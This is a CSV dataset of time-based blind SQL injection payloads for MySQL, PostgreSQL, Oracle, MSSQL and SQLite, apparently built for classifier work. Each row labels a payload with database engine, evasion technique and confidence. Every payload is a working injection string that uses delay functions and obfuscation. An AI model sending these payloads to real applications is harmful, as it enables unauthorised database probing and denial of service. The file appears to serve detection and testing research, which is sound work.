payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( 'cysu' like 'cysu",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
1' ) and sleep ( 5 ) and ( 'orxt' = 'orxt,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1'+ ( select ejaj where 1651 = 1651 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'odsl' like 'odsl,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) as wnys where 6457 = 6457 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) as eefe where 5290 = 5290 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' ) where 1424 = 1424 and sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ) +'",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
1' ) ) ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' where 8482 = 8482 or sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'cgou' like 'cgou",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
1'+ ( select ukwc where 3008 = 3008 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) and sleep ( 5 ) and ( 4855 = 4855,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1'|| ( select 'homm' where 4937 = 4937 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 6824 = 6824,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'zspf' = 'zspf",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 where 6523 = 6523 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1 ) as crsd where 5271 = 5271 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
1%' ) ) ) rlike sleep ( 5 ) and ( ( ( '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or sleep ( 5 ) and ( ( ""mcyv"" = ""mcyv",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5 ) ) ||',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""rsru"" = ""rsru",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1%' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) +'",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
"1"" and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""qqky"" like ""qqky",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" where 4161 = 4161 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lijy' = 'lijy",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( ""%"" = """,time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'yhpp' like 'yhpp",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""chvi"" like ""chvi",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1'+ ( select 'iify' where 6257 = 6257 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) +',time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" where 3329 = 3329 or sleep ( 5 ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1"" where 3990 = 3990 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'dgvg' = 'dgvg,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 8280 = 8280",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1 ) ) as uadn where 9588 = 9588 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( 4968 = 4968,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ( ( ""wueo"" = ""wueo",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 4982 = 4982,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 8679 = 8679,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""jenb"" like ""jenb",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" where 9521 = 9521 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1 ) where 4226 = 4226 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1 ) where 4600 = 4600 or sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""azzv"" like ""azzv",time_blind,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'ybjo' = 'ybjo",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1'+ ( select gkve where 1943 = 1943 waitfor delay '0:0:5' ) +',time_blind,mssql,case_variation,0.41,rule,sqliv2_csv,unknown
1 where 7299 = 7299 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'svwr' = 'svwr,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""hiwo"" like ""hiwo",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
1'+ ( select iowv where 6105 = 6105 and sleep ( 5 ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
( select 2527 from pg_sleep ( 5 ) ),time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and ( ( 'yjsp' like 'yjsp,time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1'|| ( select 'nzjz' where 3539 = 3539 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,case_variation,0.47,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( 7946 = 7946",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1%' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1' ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( 'ylql' like 'ylql",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) rlike sleep ( 5 ) and ( ""efoq"" like ""efoq",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'inec' = 'inec",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 where 5401 = 5401 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 where 5627 = 5627 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1' ) ) waitfor delay '0:0:5' and ( ( 'amnf' like 'amnf,time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1 ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 4858 = 4858",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 ) where 1203 = 1203 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) as ozga where 4002 = 4002 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1%' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( '%' = '",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""hvic"" like ""hvic",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1'+ ( select 'stsu' where 2386 = 2386 or sleep ( 5 ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%' ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( '%' = '",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'fvda' like 'fvda",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
"1%"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""%"" = """,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1%"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 9847 = 9847",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1' and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 and elt ( 1210 = 1210,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'ogpg' = 'ogpg",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'mzsy' where 4940 = 4940 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%' and elt ( 1210 = 1210,sleep ( 5 ) ) and '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'zovb' like 'zovb",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"1"" ) as wvxt where 7321 = 7321 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual# gnga",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1 ) as nlig where 5964 = 5964 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1%"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) as vlwh where 9403 = 9403 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'ljhc' = 'ljhc,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ""lhcv"" = ""lhcv",time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1%' waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1%' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) as jztg where 1222 = 1222 or sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""jbty"" like ""jbty",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( ""%"" = """,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
1%' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1%' ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' in boolean mode ) or elt ( 6272 = 6272,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' and sleep ( 5 ) and '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" or sleep ( 5 ) and ""telb"" = ""telb",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" or sleep ( 5 )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 3919 = 3919,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 2939 = 2939",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) where 5279 = 5279 or sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1%' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) as spdf where 8554 = 8554 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1 ) as xwgf where 4204 = 4204 and sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1 ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1%' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""cadh"" like ""cadh",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1' where 2123 = 2123 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 ) where 6950 = 6950 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and 'beuk' = 'beuk,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
1'|| ( select 'wszt' from dual where 6854 = 6854 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) ) ||',time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
1 and sleep ( 5 ) # qcyj,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'kyos' like 'kyos",time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) ) as bewk where 3672 = 3672 or sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) or sleep ( 5 ) and ( ""xgtk"" = ""xgtk",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1 ) ) ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1'+ ( select mrdi where 7451 = 7451 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) # hkrp",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
waitfor delay '0:0:5'# ogzq,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--",time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1%"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1 ) ) as qsos where 2721 = 2721 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) waitfor delay '0:0:5' and ( 'peyv' like 'peyv,time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
1' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""diiv"" = ""diiv",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' ) ) as kxek where 3429 = 3429 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1"" where 2547 = 2547 or sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) )",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 where 7362 = 7362 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1 ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( 1435 = 1435,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""tkkg"" = ""tkkg",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1%"" ) waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1' ) as khaa where 8157 = 8157 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1 ) ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ( 6556 = 6556",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""uvoq"" like ""uvoq",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1'+ ( select 'iyyv' where 9500 = 9500 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) +',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
